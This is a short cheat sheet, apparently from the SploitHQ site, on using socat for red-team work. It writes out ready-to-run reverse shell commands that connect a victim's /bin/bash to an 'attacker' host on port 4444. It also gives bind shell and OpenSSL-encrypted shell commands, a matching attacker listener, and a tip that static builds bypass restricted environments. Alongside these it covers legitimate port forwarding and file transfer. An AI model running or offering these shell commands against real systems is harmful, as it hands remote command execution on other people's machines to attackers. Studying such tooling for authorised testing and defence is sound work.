# socat – Versatile Tool for Network Connectivity and Redirection

**socat** (short for SOcket CAT) is a powerful command-line utility for **bidirectional data transfer** between two data channels. It's a Swiss Army knife for red teamers, penetration testers, and sysadmins needing advanced socket manipulation, port forwarding, tunneling, and shell execution.

🔗 [Explore socat Usage on SploitHQ](https://sploithq.com/socat)

---

## 🔍 What Can socat Do?

- Forward TCP or UDP connections
- Relay between files, sockets, PTYs, and devices
- Create bind and reverse shells
- Serve as a proxy or encrypted listener
- Forward connections over UNIX domain sockets, pipes, SSL, and more

---

## ⚙️ Basic Syntax

```bash
socat <channel1> <channel2>
```

Each channel can be a file, TCP/UDP port, device, or process.

---

## 🧰 Common Use Cases

| Purpose            | Example |
|--------------------|---------|
| Reverse shell      | `socat TCP:attacker:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane` |
| Bind shell         | `socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane` |
| Encrypted listener | `socat OPENSSL-LISTEN:443,cert=cert.pem,key=key.pem,fork EXEC:/bin/bash` |
| File transfer      | `socat -u FILE:file.bin TCP:host:1234` |
| Redirect to a port | `socat TCP-LISTEN:80,fork TCP:localhost:8080` |

---

## 🧪 Reverse Shell Example

### Attacker (Listener):
```bash
socat -d -d TCP-LISTEN:4444,reuseaddr,fork STDOUT
```

### Victim (Reverse shell):
```bash
socat TCP:attacker-ip:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

---

## 🧪 Bind Shell Example

### Victim:
```bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

### Attacker:
```bash
socat - TCP:target-ip:4444
```

---

## ⚠️ Notes

- `socat` is extremely flexible but also syntax-sensitive — quotes and commas matter
- Often used where `nc` or `bash /dev/tcp` are not available
- Use `-d -d` flags for debugging connection problems
- Can be statically compiled to bypass restricted environments

---

## 🌐 SploitHQ socat Resources

👉 [View socat Reverse Shells and Networking Tricks](https://sploithq.com/socat)

- Full list of bind/reverse shell variants
- Encrypted shells with OpenSSL
- File transfer and port forwarding use cases

---

## 🔗 Useful Links

- [socat Man Page (man7.org)](https://man7.org/linux/man-pages/man1/socat.1.html)
- [Red Team socat Shell Examples](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet)
- [SploitHQ socat Page](https://sploithq.com/socat)

---

## 📄 License

socat is free software under the GPL license.  
This guide is maintained by [SploitHQ](https://sploithq.com) and intended for ethical hacking, red teaming, and secure system administration.
